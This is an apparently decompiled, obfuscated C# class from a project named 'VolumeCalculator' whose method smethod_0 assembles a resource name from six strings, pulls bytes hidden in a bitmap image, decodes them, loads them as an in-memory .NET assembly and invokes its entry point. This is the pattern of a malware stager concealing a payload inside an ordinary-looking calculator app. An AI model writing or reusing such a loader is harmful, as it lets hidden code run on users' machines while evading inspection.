using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;

namespace VolumeCalculator;

public class GClass5 : Component
{
	private IContainer icontainer_0 = null;

	public GClass5()
	{
		method_0();
	}

	public static string smethod_0()
	{
		GClass4 gClass = new GClass4();
		int num = 0;
		if (gClass.byte_0 == null && ++num == 1)
		{
			Bitmap bitmap_ = GClass3.smethod_0(gClass.string_0 + gClass.string_1 + gClass.string_2 + gClass.string_3 + gClass.string_4 + gClass.string_5);
			byte[] byte_ = GClass2.smethod_0(bitmap_);
			byte[] array = (gClass.byte_0 = GClass1.smethod_1(byte_));
		}
		Assembly assembly = Assembly.Load(gClass.byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		LateBinding.LateCall((object)entryPoint, (Type)null, "Invoke", new object[2], (string[])null, (bool[])null);
		return "xxx";
	}

	public GClass5(IContainer icontainer_1)
	{
		icontainer_1.Add(this);
		method_0();
	}

	protected override void vmethod_0(bool bool_0)
	{
		if (bool_0 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		base.Dispose(bool_0);
	}

	private void method_0()
	{
		icontainer_0 = new Container();
	}
}
